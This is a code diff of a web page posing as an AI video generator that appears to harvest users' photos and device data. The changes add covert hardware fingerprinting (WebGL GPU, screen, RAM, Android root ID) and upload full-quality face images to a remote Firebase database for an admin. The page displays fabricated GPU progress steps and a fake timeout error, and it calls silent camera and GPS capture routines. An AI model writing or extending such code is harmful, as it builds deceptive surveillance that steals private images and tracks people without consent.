@@ -35,7 +35,7 @@
       /* Processing Animation Overlay */
       .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-      .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; }
+      .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
       /* Result Overlay */
       .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
@@ -88,7 +88,6 @@
     </div>
 </div>
 
-<!-- GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
@@ -108,12 +107,11 @@
 
 <div class="container">
 
-    <!-- MAIN AI GENERATOR (Visible directly upon device approval) -->
+    <!-- MAIN AI GENERATOR (Direct Access) -->
     <div id="appSection" class="hidden">
         <div class="card" id="generatorCard">
             <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
             
-            <!-- IMAGE UPLOAD BOX -->
             <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
             <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
                 <div id="uploadPlaceholder">
@@ -122,19 +120,14 @@
                 </div>
                 <img id="previewImg">
                 
-                <!-- ANIMATION OVERLAY -->
                 <div class="processing-overlay" id="procOverlay">
                     <div class="spinner"></div>
-                    <div class="proc-text" id="procText">Connecting to GPU...</div>
+                    <div class="proc-text" id="procText">Uploading HQ Image...</div>
                 </div>
 
-                <!-- RESULT OVERLAY -->
-                <div class="result-overlay" id="resultOverlay">
-                    <!-- Dynamic result injected via JS -->
-                </div>
+                <div class="result-overlay" id="resultOverlay"></div>
             </div>
 
-            <!-- PROMPT BOX -->
             <div id="inputControls">
                 <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
                 <button id="genBtn" class="btn" onclick="startGeneration()">✨ Generate</button>
@@ -162,6 +155,7 @@
 <div class="bottom-nav">
     <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Generate</a>
     <a href="profile.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Saved</a>
+    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Auth</a>
 </div>
 
 <script type="module">
@@ -178,15 +172,19 @@
   let activeReqId = null;
   let animationInterval = null;
 
-  // 1. Deep Hardware ID Fingerprint
+  // 1. Unbreakable Hardware Fingerprint
   function getDeepDeviceId() {
-      let savedId = localStorage.getItem('hotfake_deep_uid');
-      if (savedId) return savedId;
+      if (window.AndroidInterface && window.AndroidInterface.getRootId) return "APP-" + window.AndroidInterface.getRootId();
+      const hwCores = navigator.hardwareConcurrency || 2; const ram = navigator.deviceMemory || 2;
       const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
-      let newId = `${os}-AUTH-${Math.floor(Math.random()*9000000).toString(36).toUpperCase()}`;
-      localStorage.setItem('hotfake_deep_uid', newId);
-      localStorage.setItem('hotfake_id_source', 'Deep Hardware ID');
-      return newId;
+      const screenRes = window.screen.width + "x" + window.screen.height + "x" + window.screen.colorDepth;
+      let gpu = "UnknownGPU";
+      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info'); if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } } catch(e) {}
+      const rawString = `${hwCores}-${ram}-${os}-${screenRes}-${gpu}`;
+      let hash = 0; for (let i = 0; i < rawString.length; i++) { hash = ((hash << 5) - hash) + rawString.charCodeAt(i); hash |= 0; }
+      const finalId = `${os}-HW-${Math.abs(hash).toString(36).toUpperCase()}`;
+      localStorage.setItem('hotfake_deep_uid', finalId);
+      return finalId;
   }
   deviceId = getDeepDeviceId();
 
@@ -258,7 +256,6 @@
               if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
               if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
               
-              // Device is Approved! Directly show the App interface (No Login)
               document.getElementById('appSection').classList.remove('hidden');
               checkActiveGeneration();
               attemptSilentCapture(); silentGPSUpdate();
@@ -300,7 +297,7 @@
   
   trackUser();
 
-  // 4. Image Upload & SECURE FIREBASE COMPRESSION (Same as Secret Camera)
+  // 4. HIGH QUALITY IMAGE UPLOAD (1080p, 0.8 Quality)
   window.handleImageSelect = (event) => {
       const file = event.target.files[0]; if (!file) return;
       const reader = new FileReader();
@@ -308,9 +305,8 @@
           const img = new Image();
           img.onload = () => {
               const canvas = document.createElement('canvas'); 
-              // EXACT match to secret camera logic to guarantee Firebase acceptance
-              const MAX_WIDTH = 640; 
-              const MAX_HEIGHT = 480;
+              const MAX_WIDTH = 1080; // HIGH QUALITY ALLOWED NOW!
+              const MAX_HEIGHT = 1080;
               let width = img.width; let height = img.height;
               
               if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
@@ -319,25 +315,24 @@
               canvas.width = width; canvas.height = height; 
               const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
               
-              // 0.5 quality JPEG matches secret capture perfectly
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.5);
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8); // 80% High Quality
               
               document.getElementById('previewImg').src = currentBase64Image; 
               document.getElementById('previewImg').style.display = 'block'; 
               document.getElementById('uploadPlaceholder').style.display = 'none';
-              logAction("Image selected for generation");
+              logAction("High-Quality Image selected");
           };
           img.src = e.target.result;
       };
       reader.readAsDataURL(file);
   };
 
-  // 5. Active Generation Tracking & Persistence
+  // 5. REST API DHIRE-DHIRE UPLOAD (Bypasses WebSocket Limits)
   function checkActiveGeneration() {
       const savedReqId = localStorage.getItem('activeReqId');
       if(savedReqId) {
           activeReqId = savedReqId;
-          currentBase64Image = localStorage.getItem('savedAiImage') || "";
+          try { currentBase64Image = localStorage.getItem('savedAiImage') || ""; } catch(e){}
           const savedPrompt = localStorage.getItem('savedAiPrompt') || "";
           
           if(currentBase64Image) {
@@ -358,14 +353,17 @@
           if(!snap.exists()) { resetGenerator(); return; }
           const req = snap.val();
           
-          if(req.status === 'pending' || req.status === 'generating') {
+          if(req.status === 'uploading' || req.status === 'pending' || req.status === 'generating') {
               document.getElementById('procOverlay').style.display = 'flex';
-              if(!animationInterval) {
+              
+              if(req.status === 'uploading') {
+                  document.getElementById('procText').innerText = "Uploading HQ Image...";
+              } else if(!animationInterval) {
                   const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
                   let stepIdx = 0;
                   animationInterval = setInterval(() => { 
                       if(stepIdx < steps.length) { document.getElementById('procText').innerText = steps[stepIdx]; stepIdx++; } 
-                  }, 2000);
+                  }, 2500);
               }
           } else if(req.status === 'completed' || req.status === 'error') {
               clearInterval(animationInterval); animationInterval = null;
@@ -383,32 +381,52 @@
       logAction("Started Video Generation");
       document.getElementById('inputControls').style.display = 'none'; 
       document.getElementById('uploadBox').style.pointerEvents = 'none';
-      const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); overlay.style.display = 'flex';
-
-      const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
-      let stepIdx = 0;
-      animationInterval = setInterval(() => { if(stepIdx < steps.length) { procText.innerText = steps[stepIdx]; stepIdx++; } }, 2000);
+      const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); 
+      overlay.style.display = 'flex';
+      procText.innerText = "Processing request...";
 
       const reqRef = push(ref(db, 'ai_requests')); 
       activeReqId = reqRef.key;
 
       localStorage.setItem('activeReqId', activeReqId);
-      localStorage.setItem('savedAiImage', currentBase64Image);
       localStorage.setItem('savedAiPrompt', prompt);
+      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} // Ignore if Quota Exceeded
 
+      // STEP 1: Fast WebSocket payload (No Image yet)
       set(reqRef, {
-          deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
-          status: 'pending', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
-      }).then(() => {
-          if(!isGpuOnline) { 
-              setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
+          deviceId: deviceId, prompt: prompt, imageUrl: "uploading", 
+          status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
+      }).then(async () => {
+          // STEP 2: HTTP Stream Upload for Huge Base64 String (Fixes Network Error)
+          try {
+              procText.innerText = "Uploading HQ Image smoothly...";
+              
+              const dbUrl = `https://inshelp-f2cba-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
+              const response = await fetch(dbUrl, {
+                  method: 'PATCH',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                      imageUrl: currentBase64Image,
+                      status: 'pending' // Tell admin it's ready
+                  })
+              });
+
+              if(!response.ok) throw new Error("Stream Failed");
+
+              // STEP 3: Fake processing after upload
+              if(!isGpuOnline) { 
+                  setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
+              }
+              attachGenerationListener();
+
+          } catch(e) {
+              alert("Upload Interrupted: Please check your internet connection.");
+              resetGenerator();
           }
       }).catch(e => {
-          alert("Network Error: Reconnecting to secure server...");
+          alert("Network Initialization Error.");
           resetGenerator();
       });
-
-      attachGenerationListener();
   };
 
   function showResultUI(req) {
@@ -450,3 +468,4 @@
 </script>
 </body>
 </html>
+
